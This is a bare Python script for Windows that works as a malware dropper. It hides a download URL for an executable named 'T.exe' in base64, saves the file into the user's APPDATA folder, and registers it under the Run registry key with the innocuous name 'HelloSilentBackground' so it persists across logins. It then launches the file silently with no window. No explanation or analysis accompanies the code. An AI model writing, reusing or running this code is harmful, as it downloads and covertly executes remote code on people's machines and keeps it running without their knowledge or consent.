import os
import urllib.request
import winreg
import subprocess
import base64

def main():
    encoded_nox = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Jvb3RIYXJweS9Sb290SGFycHkvcmVmcy9oZWFkcy9tYWluL1QuZXhl"
    nox = base64.b64decode(encoded_nox).decode()
    appdata = os.getenv("APPDATA")
    exe_path = os.path.join(appdata, "T.exe")
    urllib.request.urlretrieve(nox, exe_path)

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "HelloSilentBackground", 0, winreg.REG_SZ, f'"{exe_path}"')
    winreg.CloseKey(key)
    subprocess.Popen([exe_path], creationflags=0x08000000,
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
if __name__ == "__main__":
    main()
